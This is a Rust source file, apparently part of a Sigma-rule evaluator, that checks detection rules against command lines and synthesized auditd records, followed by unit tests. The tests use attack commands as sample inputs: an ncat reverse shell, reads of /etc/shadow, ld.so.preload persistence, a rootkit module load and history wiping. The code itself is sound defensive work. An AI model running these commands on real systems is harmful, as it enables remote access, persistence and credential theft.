    // SYSCALL: `comm` is the kernel's task name — the basename of what was
    // executed, truncated to 15 characters. Unlike `exe` it survives a symlink,
    // so it is exact.
    let mut syscall = HashMap::new();
    syscall.insert("type".to_string(), "SYSCALL".to_string());
    syscall.insert("comm".to_string(), truncate_comm(&cmd.program));
    records.push(Event {
        fields: Cow::Owned(syscall),
        partial: HashSet::new(),
    });

    // PATH: one record per file the action touches — the ones the command names,
    // plus any the caller knows of from the entry's `event` axis. A relative
    // path is partial: the segment is known, the directory it resolves against
    // is not.
    let mut operands = path_operands(cmd);
    for f in files {
        if !operands.iter().any(|p| p == f) {
            operands.push((*f).to_string());
        }
    }
    for operand in operands {
        let absolute = operand.starts_with('/');
        let mut path = HashMap::new();
        path.insert("type".to_string(), "PATH".to_string());
        path.insert("name".to_string(), operand);
        records.push(Event {
            fields: Cow::Owned(path),
            partial: if absolute {
                HashSet::new()
            } else {
                HashSet::from(["name"])
            },
        });
    }

    records
}

/// The kernel's 16-byte `comm`, minus its terminator. A longer program name is
/// truncated in the record, so a rule keyed on the full name genuinely does not
/// match one — reproducing that is fidelity, not a limitation.
fn truncate_comm(program: &str) -> String {
    program.chars().take(15).collect()
}

/// The files a command names, as an auditd `PATH` record would report them.
///
/// Over-approximate on purpose: a token that looks like a path is taken as one,
/// since the alternative is deriving no `PATH` record at all and abstaining on
/// every rule that keys `name`. Flags are skipped, a `key=/path` operand yields
/// its value (`dd of=/dev/sda`), and a URL is not a file.
fn path_operands(cmd: &Command) -> Vec<String> {
    let mut out = Vec::new();
    for arg in &cmd.args {
        if arg.starts_with('-') || arg.contains("://") {
            continue;
        }
        let candidate = match arg.split_once('=') {
            Some((_, value)) => value,
            None => arg.as_str(),
        };
        if candidate.contains('/') && !out.iter().any(|p| p == candidate) {
            out.push(candidate.to_string());
        }
    }
    out
}

/// The Windows dash characters `windash` treats as interchangeable. The set
/// includes `-` and `/` themselves, so a value authored either way gains the
/// other's form.
const WINDASHES: [char; 5] = ['-', '/', '\u{2013}', '\u{2014}', '\u{2015}'];

/// Expand a value into its `windash` variants.
///
/// Mirrors pySigma's `re.sub(r"\B[-/]", c, value)` for each dash character.
/// The `\B` reduces to "the preceding character is absent or is a non-word
/// character", which is what keeps `foo-bar` intact while rewriting the flag in
/// ` -s `. All eligible positions are rewritten to the *same* character in each
/// variant, so ` -a -b` yields five variants rather than twenty-five.
///
/// Wildcard segments need no special handling: a dash following `*` has a
/// non-word predecessor here just as it has no predecessor in a per-segment
/// substitution, so both agree.
fn windash_variants(value: &str) -> Vec<String> {
    let is_word = |c: char| c.is_alphanumeric() || c == '_';
    let mut sites = Vec::new();
    let mut prev: Option<char> = None;
    for (i, c) in value.char_indices() {
        if (c == '-' || c == '/') && prev.is_none_or(|p| !is_word(p)) {
            sites.push(i);
        }
        prev = Some(c);
    }
    if sites.is_empty() {
        return vec![value.to_string()];
    }
    dedup_in_order(
        WINDASHES
            .iter()
            .map(|&d| {
                let mut out = String::with_capacity(value.len() + sites.len() * 3);
                let mut last = 0;
                for &i in &sites {
                    out.push_str(&value[last..i]);
                    out.push(d);
                    last = i + 1; // '-' and '/' are one byte each
                }
                out.push_str(&value[last..]);
                out
            })
            .collect(),
    )
}

const B64_ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Standard-alphabet base64 with `=` padding.
///
/// Hand-rolled rather than pulled in as a dependency: only encoding is needed,
/// and `opseclint-core` has no base64 crate available to it.
fn base64_encode(input: &[u8]) -> String {
    let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
    for c in input.chunks(3) {
        let n = (c[0] as u32) << 16
            | (*c.get(1).unwrap_or(&0) as u32) << 8
            | (*c.get(2).unwrap_or(&0) as u32);
        out.push(B64_ALPHABET[(n >> 18 & 63) as usize] as char);
        out.push(B64_ALPHABET[(n >> 12 & 63) as usize] as char);
        out.push(if c.len() > 1 {
            B64_ALPHABET[(n >> 6 & 63) as usize] as char
        } else {
            '='
        });
        out.push(if c.len() > 2 {
            B64_ALPHABET[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// Leading characters to drop per alignment, and trailing characters to drop
/// per `(value length + alignment) % 3`. Both ends carry bits from outside the
/// value, so they cannot be part of a needle.
const B64_START: [usize; 3] = [0, 2, 3];
const B64_END: [usize; 3] = [0, 3, 2];

/// The three encodings of `value` as it would appear inside a larger base64
/// blob, one per byte alignment.
///
/// `None` for a value shorter than three bytes. At one byte the middle
/// alignment slices to an *empty* needle, and `contains("")` is true of every
/// command line — the rule would appear to fire on everything. The other
/// alignments leave one or two characters, which match almost any blob.
/// Abstaining says what we actually know.
///
/// The padding byte's value is irrelevant: every base64 character it influences
/// falls inside the `B64_START` prefix that gets trimmed.
fn base64offset_variants(value: &str) -> Option<Vec<String>> {
    let bytes = value.as_bytes();
    if bytes.len() < 3 {
        return None;
    }
    Some(
        (0..3)
            .map(|i| {
                let mut buf = vec![b' '; i];
                buf.extend_from_slice(bytes);
                let enc = base64_encode(&buf);
                let end = enc.len() - B64_END[(bytes.len() + i) % 3];
                enc[B64_START[i]..end].to_string()
            })
            .collect(),
    )
}

/// Reduce the needle groups to a verdict: any needle satisfies its own group,
/// and `all` decides whether every group or merely one has to be satisfied.
///
/// `hit` is three-valued rather than boolean because a needle put to a partial
/// field can come back undecided (see [`needle_hit`]), and folding that to
/// `false` here would lose it. The reduction is the same shape either way —
/// Kleene `or` within a group, `and`/`or` across them.
fn group_reduce(fm: &FieldMatch, hit: impl Fn(&str) -> Ternary) -> Ternary {
    let groups = fm.needles.iter().map(|g| or_all(g.iter().map(|n| hit(n))));
    if fm.all {
        and_all(groups)
    } else {
        or_all(groups)
    }
}

/// The final segment of a path, under either separator. `/usr/bin/curl` and
/// `C:\\Windows\\cmd.exe` both reduce to their basename; a value with no
/// separator is already its own final segment.
fn final_segment(path: &str) -> &str {
    match path.rfind(['/', '\\']) {
        Some(i) => &path[i + 1..],
        None => path,
    }
}

/// Put one needle to a value, three-valued, accounting for a `partial` value
/// whose directory was synthesized rather than observed.
///
/// The whole of the uncertainty is the *directory*: the final segment is known.
/// So a needle that names no directory is a claim about the program, and the
/// segment we have answers it — that is what makes `|endswith: '/curl'` decide,
/// and it is why the stand-in exists at all. A needle that *does* name a
/// directory is asking about the invented part, and gets one of two answers:
/// if it would match were the directory right, we cannot say no (`Unknown`);
/// if its own final segment disagrees with ours, no directory could rescue it
/// and the answer is a real `false`.
fn needle_hit(
    hit: &impl Fn(&str, &str) -> bool,
    value: &str,
    needle: &str,
    partial: bool,
) -> Ternary {
    if hit(value, needle) {
        return Ternary::True;
    }
    if !partial || !needle.contains(['/', '\\']) {
        return Ternary::False;
    }
    // Re-put the same question to the final segments alone, through the same
    // `hit` so the operator and its case folding are preserved: a `startswith`
    // needle stays a prefix test, a glob stays a glob. Matching there means the
    // directory was the only thing in the way, and the directory is what we
    // invented.
    if hit(final_segment(value), final_segment(needle)) {
        Ternary::Unknown
    } else {
        Ternary::False
    }
}

fn eval_field(fm: &FieldMatch, event: &Event) -> Ternary {
    if !fm.supported() {
        return Ternary::Unknown;
    }
    let Some(raw) = event.get(&fm.field) else {
        return Ternary::Unknown;
    };
    let partial = event.is_partial(&fm.field);
    // Addresses are compared numerically, not as text.
    if let MatchOp::Cidr(nets) = &fm.op {
        // Not an address, so we cannot say it is outside the network either.
        let Some(ip) = parse_event_ip(raw) else {
            return Ternary::Unknown;
        };
        let matched = if fm.all {
            nets.iter().all(|n| n.contains(ip))
        } else {
            nets.iter().any(|n| n.contains(ip))
        };
        return if matched {
            Ternary::True
        } else {
            Ternary::False
        };
    }

    // Patterns compile case-insensitively, so they run against the raw value —
    // a pre-lowercased haystack would defeat an inline `(?-i)`.
    if let MatchOp::Re(res) = &fm.op {
        // A pattern is not decomposable into "the part about the directory" and
        // "the part about the program" the way a literal needle is — an anchored
        // `^/curl$` would match the stand-in and miss the real path, so even a
        // hit proves nothing. Abstain outright on a partial field.
        if partial {
            return Ternary::Unknown;
        }
        let matched = if fm.all {
            res.iter().all(|r| r.is_match(raw))
        } else {
            res.iter().any(|r| r.is_match(raw))
        };
        return if matched {
            Ternary::True
        } else {
            Ternary::False
        };
    }

    let val = if fm.case_sensitive {
        raw.to_string()
    } else {
        raw.to_lowercase()
    };
    let hit = |haystack: &str, needle: &str| match fm.op {
        MatchOp::Contains => haystack.contains(needle),
        MatchOp::StartsWith => haystack.starts_with(needle),
        MatchOp::EndsWith => haystack.ends_with(needle),
        // `Re` and `Cidr` are handled above; neither reaches the needle loop.
        MatchOp::Glob | MatchOp::Re(_) | MatchOp::Cidr(_) => glob_match(haystack, needle),
    };
    group_reduce(fm, |needle| {
        let n = if fm.case_sensitive {
            needle.to_string()
        } else {
            needle.to_lowercase()
        };
        needle_hit(&hit, &val, &n, partial)
    })
}

fn eval_search(s: &Search, event: &Event) -> Ternary {
    match s {
        Search::Fields(fms) => and_all(fms.iter().map(|f| eval_field(f, event))),
        Search::OneOfMaps(groups) => or_all(
            groups
                .iter()
                .map(|g| and_all(g.iter().map(|f| eval_field(f, event)))),
        ),
        Search::Keywords { values, all } => match event.get("CommandLine") {
            Some(cl) => {
                let cl = cl.to_lowercase();
                let mut hits = values.iter().map(|k| keyword_match(&cl, &k.to_lowercase()));
                let matched = if *all {
                    hits.all(|h| h)
                } else {
                    hits.any(|h| h)
                };
                if matched {
                    Ternary::True
                } else {
                    Ternary::False
                }
            }
            None => Ternary::Unknown,
        },
    }
}

fn matching_ids<'a>(pat: &str, searches: &'a HashMap<String, Search>) -> Vec<&'a str> {
    if pat == "them" {
        searches.keys().map(String::as_str).collect()
    } else if let Some(prefix) = pat.strip_suffix('*') {
        searches
            .keys()
            .filter(|k| k.starts_with(prefix))
            .map(String::as_str)
            .collect()
    } else {
        searches
            .keys()
            .filter(|k| k.as_str() == pat)
            .map(String::as_str)
            .collect()
    }
}

fn eval_cond(cond: &Cond, searches: &HashMap<String, Search>, event: &Event) -> Ternary {
    match cond {
        Cond::Id(name) => searches
            .get(name)
            .map(|s| eval_search(s, event))
            .unwrap_or(Ternary::Unknown),
        Cond::Not(c) => not_(eval_cond(c, searches, event)),
        Cond::And(a, b) => and_all([eval_cond(a, searches, event), eval_cond(b, searches, event)]),
        Cond::Or(a, b) => or_all([eval_cond(a, searches, event), eval_cond(b, searches, event)]),
        Cond::Quant { n, pat } => {
            let terns: Vec<Ternary> = matching_ids(pat, searches)
                .iter()
                .filter_map(|id| searches.get(*id))
                .map(|s| eval_search(s, event))
                .collect();
            match n {
                None => and_all(terns),
                Some(k) => {
                    let t = terns.iter().filter(|x| **x == Ternary::True).count();
                    let u = terns.iter().filter(|x| **x == Ternary::Unknown).count();
                    if t >= *k {
                        Ternary::True
                    } else if t + u >= *k {
                        Ternary::Unknown
                    } else {
                        Ternary::False
                    }
                }
            }
        }
    }
}

fn collect_fields(s: &Search, out: &mut HashSet<String>) {
    match s {
        Search::Fields(fms) => out.extend(fms.iter().map(|f| f.field.clone())),
        Search::OneOfMaps(groups) => {
            for g in groups {
                out.extend(g.iter().map(|f| f.field.clone()));
            }
        }
        Search::Keywords { .. } => {
            out.insert("CommandLine".to_string());
        }
    }
}

fn referenced_fields(rule: &DetectionRule) -> HashSet<String> {
    let mut out = HashSet::new();
    for s in rule.searches.values() {
        collect_fields(s, &mut out);
    }
    out
}

fn collect_unsupported(s: &Search, mods: &mut HashSet<String>, null_values: &mut bool) {
    let mut scan = |fms: &[FieldMatch]| {
        for f in fms {
            mods.extend(f.unsupported_mods.iter().cloned());
            mods.extend(f.fallible_mod().map(str::to_string));
            *null_values |= f.null_values;
        }
    };
    match s {
        Search::Fields(fms) => scan(fms),
        Search::OneOfMaps(groups) => groups.iter().for_each(|g| scan(g)),
        Search::Keywords { .. } => {}
    }
}

/// Modifiers the rule uses that this evaluator does not implement, and whether
/// it asserts a field is absent. Same semantics as [`referenced_fields`]: these
/// are *present in the rule*, not proven to be the branch that forced `Unknown`.
fn unsupported_features(rule: &DetectionRule) -> (Vec<String>, bool) {
    let mut mods = HashSet::new();
    let mut null_values = false;
    for s in rule.searches.values() {
        collect_unsupported(s, &mut mods, &mut null_values);
    }
    let mut mods: Vec<String> = mods.into_iter().collect();
    mods.sort();
    (mods, null_values)
}

/// Evaluate a rule against a command using only the fields synthesizable from a
/// command line (`CommandLine` / `Image` / `OriginalFileName`) — predictive
/// mode. A rule keyed on a field a static command line cannot supply (a parent,
/// a user, an integrity level, a hash) evaluates to `Indeterminate`.
pub fn evaluate(rule: &DetectionRule, cmd: &Command, platform: Platform) -> Verdict {
    evaluate_touching(rule, cmd, platform, &[])
}

/// [`evaluate`], told which files the action touches beyond the ones its command
/// line names.
///
/// A knowledge-base entry's `event` axis says what file the action writes —
/// `/etc/ld.so.preload` for the preload-injection entry — and that is the file
/// auditd would emit a `PATH` record for. The command line often does not
/// contain it: the entry matches on the *line* containing `ld.so.preload`, and
/// its representative is that fragment rather than a full `echo … > /etc/…`.
/// Without this the `PATH` rule watching exactly that file would be told the
/// action touches nothing and would refuse a claim it in fact substantiates.
pub fn evaluate_touching(
    rule: &DetectionRule,
    cmd: &Command,
    platform: Platform,
    files: &[&str],
) -> Verdict {
    // On Linux a rule may be written against auditd's own records rather than
    // against a process-creation event — SigmaHQ carries a whole `linux/auditd`
    // tree, and those rules declare no logsource category, so they arrive here
    // and are asked about `type`, `a0`, `comm`, `name`.
    if platform == Platform::LinuxAuditd && auditd_shaped(rule) {
        return fold_records(rule, &auditd_records(cmd, files));
    }
    eval_event(rule, &synthesize(cmd, platform))
}

/// Fields that exist only in an auditd record, and so identify a rule written
/// against one. `a0`, `a1`, … are the argument vector and are matched by shape.
///
/// The two namespaces do not mix: an auditd rule keys on these, a
/// process-creation rule keys on `Image` / `CommandLine`. Asking the process
/// event about an auditd rule produces an abstention about fields it was never
/// going to have, and asking an auditd record about a process-creation rule
/// does the same in reverse. So the rule picks which kind of event it is about,
/// and only that kind is asked.
const AUDITD_FIELDS: [&str; 8] = [
    "type", "comm", "exe", "key", "name", "nametype", "SYSCALL", "argc",
];

fn auditd_shaped(rule: &DetectionRule) -> bool {
    referenced_fields(rule).iter().any(|f| {
        AUDITD_FIELDS.contains(&f.as_str())
            || f.strip_prefix('a')
                .is_some_and(|n| !n.is_empty() && n.chars().all(|c| c.is_ascii_digit()))
    })
}

/// Fold one auditd rule's verdict across the records of a single event.
///
/// One firing record settles it, the same way one firing rule settles a claim:
/// the question is whether a real rule catches the action, not whether every
/// record the action produces separately matches.
///
/// The subtlety is on the other side. A rule written against `type: 'PATH'` and
/// `name` is not a question about the `EXECVE` record, and that record's "I
/// carry neither of those" is not an abstention — it is the wrong record
/// answering. So a record whose only complaint is about fields another record
/// *does* supply drops out of the fold entirely, exactly as a rule from another
/// logsource is set aside rather than counted indeterminate. What is left are
/// the abstentions someone genuinely could not answer.
fn fold_records(rule: &DetectionRule, records: &[Event]) -> Verdict {
    let verdicts: Vec<Verdict> = records.iter().map(|e| eval_event(rule, e)).collect();

    if let Some(fired) = verdicts.iter().find(|v| v.outcome == Outcome::Fires) {
        return fired.clone();
    }

    let supplied: HashSet<&str> = records
        .iter()
        .flat_map(|e| e.fields.keys().map(String::as_str))
        .collect();
    // "This record was the wrong one to ask": indeterminate purely because of
    // fields that live on another record, with nothing else unresolved.
    let asked_elsewhere = |v: &Verdict| {
        v.outcome == Outcome::Indeterminate
            && v.blocking_modifiers.is_empty()
            && v.partial_fields.is_empty()
            && !v.null_value_match
            && !v.missing_fields.is_empty()
            && v.missing_fields
                .iter()
                .all(|f| supplied.contains(f.as_str()))
    };
    let kept: Vec<&Verdict> = verdicts.iter().filter(|v| !asked_elsewhere(v)).collect();

    if !kept.is_empty() && kept.iter().all(|v| v.outcome == Outcome::NoFire) {
        return Verdict {
            outcome: Outcome::NoFire,
            missing_fields: Vec::new(),
            partial_fields: Vec::new(),
            blocking_modifiers: Vec::new(),
            null_value_match: false,
        };
    }

    // Nothing survived: every record was the wrong one to ask, which means the
    // rule spans records no single one of ours carries together. Unfiltered
    // causes, so the abstention still says what it was waiting on.
    let causes: Vec<&Verdict> = if kept.is_empty() {
        verdicts.iter().collect()
    } else {
        kept
    };
    let mut missing_fields: Vec<String> = causes
        .iter()
        .flat_map(|v| v.missing_fields.iter())
        .cloned()
        .collect();
    let mut partial_fields: Vec<String> = causes
        .iter()
        .flat_map(|v| v.partial_fields.iter())
        .cloned()
        .collect();
    let mut blocking_modifiers: Vec<String> = causes
        .iter()
        .flat_map(|v| v.blocking_modifiers.iter())
        .cloned()
        .collect();
    for list in [
        &mut missing_fields,
        &mut partial_fields,
        &mut blocking_modifiers,
    ] {
        list.sort();
        list.dedup();
    }
    Verdict {
        outcome: Outcome::Indeterminate,
        missing_fields,
        partial_fields,
        blocking_modifiers,
        null_value_match: causes.iter().any(|v| v.null_value_match),
    }
}

/// Evaluate a rule against a *real recorded* event: the synthesized base
/// extended and overridden by the fields a sensor actually logged. Because the
/// real event supplies the context a command line alone cannot — `ParentImage`,
/// `User`, `IntegrityLevel`, … — verdicts that are `Indeterminate` in predictive
/// mode resolve to `Fires` / `NoFire` here. `observed` keys must be the
/// canonical field names a Sigma rule references (e.g. `ParentImage`); empty
/// values are ignored so a blank field cannot mask the synthesized fallback.
pub fn evaluate_observed(
    rule: &DetectionRule,
    cmd: &Command,
    platform: Platform,
    observed: &HashMap<String, String>,
) -> Verdict {
    let mut event = synthesize(cmd, platform);
    for (k, v) in observed {
        if !v.is_empty() {
            event.observe(k, v);
        }
    }
    eval_event(rule, &event)
}

/// Evaluate a rule against a **non-execution record** — a file, registry or
/// network event's own fields, with no process-execution base underneath.
///
/// Unlike [`evaluate_observed`], nothing is synthesized. A rule keyed on
/// `CommandLine` or `Image` sees them absent and abstains, rather than being
/// answered with a command line that was never part of the record: the fields a
/// file or registry rule is asked about have to come from the record itself, or
/// a rule that happens to key on `CommandLine` would fire on evidence from a
/// different log source entirely.
pub fn evaluate_record(rule: &DetectionRule, event: &HashMap<String, String>) -> Verdict {
    eval_event(rule, &Event::known(event))
}

/// Evaluate a rule's condition against a fully-built event, reporting the fields
/// it referenced but the event did not carry when the verdict is indeterminate.
fn eval_event(rule: &DetectionRule, event: &Event) -> Verdict {
    let outcome = match eval_cond(&rule.condition, &rule.searches, event) {
        Ternary::True => Outcome::Fires,
        Ternary::False => Outcome::NoFire,
        Ternary::Unknown => Outcome::Indeterminate,
    };
    if outcome != Outcome::Indeterminate {
        return Verdict {
            outcome,
            missing_fields: Vec::new(),
            partial_fields: Vec::new(),
            blocking_modifiers: Vec::new(),
            null_value_match: false,
        };
    }
    let referenced = referenced_fields(rule);
    let mut missing_fields: Vec<String> = referenced
        .iter()
        .filter(|f| !f.is_empty() && !event.contains_key(f))
        .cloned()
        .collect();
    missing_fields.sort();
    // Present, but only as far as its final segment. Over-approximated the same
    // way `missing_fields` is: every partial field the rule referenced, not
    // only the one whose abstention decided the outcome.
    let mut partial_fields: Vec<String> = referenced
        .iter()
        .filter(|f| event.is_partial(f))
        .cloned()
        .collect();
    partial_fields.sort();
    let (blocking_modifiers, null_value_match) = unsupported_features(rule);
    Verdict {
        outcome,
        missing_fields,
        partial_fields,
        blocking_modifiers,
        null_value_match,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_line;

    fn cmd(s: &str) -> Command {
        parse_line(s).into_iter().next().expect("a command")
    }

    fn verdict(yaml: &str, command: &str) -> Verdict {
        let rule = parse_rule(yaml).expect("rule parses");
        evaluate(&rule, &cmd(command), Platform::LinuxAuditd)
    }

    /// Evaluate against a command plus the fields a sensor would have recorded.
    fn observed_verdict(yaml: &str, command: &str, fields: &[(&str, &str)]) -> Verdict {
        let rule = parse_rule(yaml).expect("rule parses");
        let observed: HashMap<String, String> = fields
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        evaluate_observed(&rule, &cmd(command), Platform::LinuxAuditd, &observed)
    }

    /// A rule keyed on an absolute `Image` path, the shape that used to be
    /// answered with a basename and read as a refusal.
    const ABSOLUTE_IMAGE: &str = r#"
title: Screen capture
id: r-abs
detection:
    selection:
        Image: '/usr/sbin/screencapture'
    condition: selection
"#;

    #[test]
    fn an_absolute_path_against_a_synthesized_image_abstains() {
        // `Image` is synthesized as `/screencapture`, so a literal comparison
        // against `/usr/sbin/screencapture` is false — but only because the
        // directory was invented. Reporting that as NO-FIRE is what withdrew
        // four macOS claims the ruleset never actually refuted.
        let v = verdict(ABSOLUTE_IMAGE, "screencapture -x /tmp/out.png");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(v.partial_fields, vec!["Image".to_string()]);
        assert!(
            v.missing_fields.is_empty(),
            "Image was present, not missing: {:?}",
            v.missing_fields
        );
    }

    #[test]
    fn a_different_program_is_still_refused() {
        // The abstention is about the directory alone. A rule naming another
        // program disagrees on the segment we *do* know, and no directory could
        // rescue it — so this stays a real negative.
        let v = verdict(ABSOLUTE_IMAGE, "mdfind -name secret");
        assert_eq!(v.outcome, Outcome::NoFire);
    }

    #[test]
    fn an_observed_image_decides_what_the_stand_in_could_not() {
        // The recorded path is exact, so the field stops being partial and the
        // same rule resolves — in both directions.
        let fires = observed_verdict(
            ABSOLUTE_IMAGE,
            "screencapture -x /tmp/out.png",
            &[("Image", "/usr/sbin/screencapture")],
        );
        assert_eq!(fires.outcome, Outcome::Fires);
        let misses = observed_verdict(
            ABSOLUTE_IMAGE,
            "screencapture -x /tmp/out.png",
            &[("Image", "/opt/homebrew/bin/screencapture")],
        );
        assert_eq!(misses.outcome, Outcome::NoFire);
    }

    #[test]
    fn a_needle_naming_no_directory_still_decides() {
        // Only the directory is unknown, so a needle that names none of it is
        // a claim about the program — which the synthesized segment answers.
        // This is the form real rules are written in, and it must keep deciding
        // or the stand-in would have no purpose at all.
        let yaml = r#"
title: Curl download
id: r-ends
detection:
    selection:
        Image|endswith: '/curl'
    condition: selection
"#;
        assert_eq!(
            verdict(yaml, "curl -o /tmp/x http://example.com/x").outcome,
            Outcome::Fires
        );
        assert_eq!(
            verdict(yaml, "wget http://example.com/x").outcome,
            Outcome::NoFire
        );
    }

    /// SigmaHQ's auditd rules, in the two shapes that matter: an `EXECVE`
    /// record's argument vector, and a `SYSCALL` record's task name.
    const AUDITD_EXECVE: &str = r#"
title: Discovery via auditd
id: r-execve
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'EXECVE'
        a0: 'chattr'
        a1|contains: '+i'
    condition: selection
"#;

    #[test]
    fn an_auditd_execve_rule_fires_on_the_synthesized_record() {
        // Neither `type` nor `a0` exists on a process-creation event, so this
        // rule used to be asked a question it could not hear.
        let v = verdict(AUDITD_EXECVE, "chattr +i /etc/passwd");
        assert_eq!(v.outcome, Outcome::Fires);
    }

    #[test]
    fn an_auditd_execve_rule_still_refuses_the_wrong_arguments() {
        let v = verdict(AUDITD_EXECVE, "chattr -i /etc/passwd");
        assert_eq!(v.outcome, Outcome::NoFire);
    }

    #[test]
    fn an_auditd_path_record_comes_from_the_file_the_command_names() {
        let yaml = r#"
title: Preload persistence
id: r-path
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'PATH'
        name: '/etc/ld.so.preload'
    condition: selection
"#;
        assert_eq!(
            verdict(yaml, "echo /tmp/x.so > /etc/ld.so.preload").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn a_file_the_entry_names_gets_its_own_path_record() {
        // The command line is a fragment — the entry matches on the *line*
        // containing `ld.so.preload` — so the file comes from the caller, and
        // the rule watching exactly that path is answered rather than refused.
        let yaml = r#"
title: Preload modification
id: r-path-2
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'PATH'
        name: '/etc/ld.so.preload'
    condition: selection
"#;
        let rule = parse_rule(yaml).expect("rule parses");
        let cmd = cmd("ld.so.preload");
        assert_eq!(
            evaluate(&rule, &cmd, Platform::LinuxAuditd).outcome,
            Outcome::NoFire
        );
        assert_eq!(
            evaluate_touching(&rule, &cmd, Platform::LinuxAuditd, &["/etc/ld.so.preload"]).outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn a_resolved_executable_is_not_guessed_from_the_program_name() {
        // `insmod` is a symlink to `/usr/bin/kmod`, so auditd's `exe` differs
        // from the command in its *basename*, not merely its directory —
        // synthesizing one would refute a rule that really does fire.
        let yaml = r#"
title: Module load
id: r-exe
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'SYSCALL'
        comm: 'insmod'
        exe: '/usr/bin/kmod'
    condition: selection
"#;
        let v = verdict(yaml, "insmod /tmp/rootkit.ko");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert_eq!(v.missing_fields, vec!["exe".to_string()]);
    }

    #[test]
    fn a_process_creation_rule_is_not_answered_by_an_auditd_record() {
        // The auditd records carry no `Image`, and folding their abstention in
        // would turn a decided verdict indeterminate. A rule that keys on
        // fields the process event has is the process event's question.
        let yaml = r#"
title: Curl
id: r-proc
detection:
    selection:
        Image|endswith: '/curl'
    condition: selection
"#;
        assert_eq!(
            verdict(yaml, "wget http://example.com/x").outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn a_keyword_list_carrying_the_all_modifier_is_still_a_keyword_list() {
        // Written as a map so it can hold `|all`, this used to lower to a
        // comparison against a field named "" — an abstention that did not even
        // say what it was waiting on. Fourteen SigmaHQ rules are written so.
        let yaml = r#"
title: Credentials in files
id: r-kw-all
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'EXECVE'
    keywords:
        '|all':
            - 'grep'
            - 'password'
    condition: selection and keywords
"#;
        assert_eq!(
            verdict(yaml, "grep -r password /etc").outcome,
            Outcome::Fires
        );
        // `all` means every term, not any: without the second one it misses.
        assert_eq!(
            verdict(yaml, "grep -r secret /etc").outcome,
            Outcome::NoFire
        );
    }

    /// A keyword list, the shape SigmaHQ's `builtin/` rules use: no field
    /// names, matched against the command line as substrings.
    const HISTORY_TAMPER: &str = r#"
title: History tampering
id: r-kw
detection:
    keywords:
        - 'rm *sh_history'
        - 'history -c'
    condition: keywords
"#;

    #[test]
    fn a_keyword_wildcard_matches_across_the_gap() {
        // The bug this replaced: `rm *sh_history` was compared literally, so it
        // matched nothing a person would ever type.
        assert_eq!(
            verdict(HISTORY_TAMPER, "rm -f ~/.bash_history").outcome,
            Outcome::Fires
        );
        assert_eq!(
            verdict(HISTORY_TAMPER, "rm /home/op/.zsh_history").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn a_keyword_without_a_wildcard_is_still_a_plain_substring() {
        assert_eq!(
            verdict(HISTORY_TAMPER, "history -c").outcome,
            Outcome::Fires
        );
        // ...and still anchored nowhere: a substring anywhere on the line.
        assert_eq!(
            verdict(HISTORY_TAMPER, "bash -lc 'history -c'").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn a_keyword_wildcard_does_not_match_everything() {
        // The failure mode of a too-eager fix: `*` spanning the whole line.
        assert_eq!(verdict(HISTORY_TAMPER, "ls -la").outcome, Outcome::NoFire);
        // `rm` and a history file, but not in that order — the wildcard fills a
        // gap, it does not reorder the terms around it.
        assert_eq!(
            verdict(HISTORY_TAMPER, "cat ~/.bash_history && rm /tmp/x").outcome,
            Outcome::NoFire
        );
    }

    #[test]
    fn keyword_matching_is_case_insensitive_either_way() {
        assert_eq!(
            verdict(HISTORY_TAMPER, "RM -F ~/.BASH_HISTORY").outcome,
            Outcome::Fires
        );
    }

    const SHADOW: &str = r#"
title: Shadow read
id: r1
detection:
    selection:
        CommandLine|contains: '/etc/shadow'
    condition: selection
"#;

    const PARENT: &str = r#"
title: Whoami under sshd
id: r2
detection:
    selection:
        ParentImage|endswith: '/sshd'
        CommandLine|contains: 'whoami'
    condition: selection
"#;

    const FILTER: &str = r#"
title: Curl not apt
id: r3
detection:
    selection:
        CommandLine|contains: 'curl'
    filter:
        CommandLine|contains: 'apt'
    condition: selection and not filter
"#;

    const ONEOF: &str = r#"
title: Netcat
id: r4
detection:
    selection_nc:
        CommandLine|contains: 'nc '
    selection_ncat:
        CommandLine|contains: 'ncat'
    condition: 1 of selection_*
"#;

    #[test]
    fn fires_on_direct_match() {
        assert_eq!(verdict(SHADOW, "cat /etc/shadow").outcome, Outcome::Fires);
    }

    #[test]
    fn indeterminate_when_field_unavailable() {
        let v = verdict(PARENT, "whoami");
        assert_eq!(v.outcome, Outcome::Indeterminate);
        assert!(v.missing_fields.iter().any(|f| f == "ParentImage"));
    }

    #[test]
    fn no_fire_when_filter_excludes() {
        assert_eq!(
            verdict(FILTER, "curl http://apt/x").outcome,
            Outcome::NoFire
        );
        // …but without the filter term it fires.
        assert_eq!(
            verdict(FILTER, "curl http://evil/x").outcome,
            Outcome::Fires
        );
    }

    #[test]
    fn one_of_pattern() {
        assert_eq!(
            verdict(ONEOF, "ncat -e /bin/sh 10.0.0.1 4444").outcome,
            Outcome::Fires
        );
        assert_eq!(verdict(ONEOF, "ls -la").outcome, Outcome::NoFire);
    }

    #[test]
    fn unsupported_modifier_is_indeterminate() {
        // `fieldref` stands in for "any modifier we do not implement". If it
        // ever lands, re-point this test at another unimplemented token rather
        // than deleting it — the property is that an unknown modifier abstains.
        let yaml = "title: t\nid: r5\ndetection:\n    selection:\n        CommandLine|fieldref: 'ParentCommandLine'\n    condition: selection\n";
        assert_eq!(
            verdict(yaml, "cat /etc/shadow").outcome,
            Outcome::Indeterminate
        );
    }

    /// The two actionable causes of abstention must be distinguishable: an
    /// unimplemented modifier is evaluator work, a missing field is telemetry
    /// the tool would have to be handed. Collapsing them makes the
    /// indeterminate count undiagnosable.
    #[test]
    fn modifier_block_is_reported_and_distinct_from_a_missing_field() {
